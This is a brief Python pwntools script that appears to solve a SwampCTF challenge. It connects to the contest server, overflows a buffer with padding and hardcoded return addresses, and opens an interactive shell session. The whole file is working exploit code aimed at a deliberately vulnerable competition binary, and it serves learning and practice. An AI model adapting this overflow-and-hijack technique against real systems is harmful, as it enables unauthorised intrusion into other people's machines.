from pwn import *

def main():
	#p = process("./return")
	#gdb.attach(p, "break *0x8048544")
	p = remote("chal1.swampctf.com", 1802)
	print p.recvuntil("do:")
	payload = "A"*26
	payload += "B"*4
	payload += p32(0x43434343)
	payload += "D" * 8
	payload += p32(0x8048372)
	#payload += p32(0x80485db)
	payload += p32(0x8048615)

	p.sendline(payload)
	#print p.recvall()
	p.interactive()

if __name__ == "__main__":
	main()
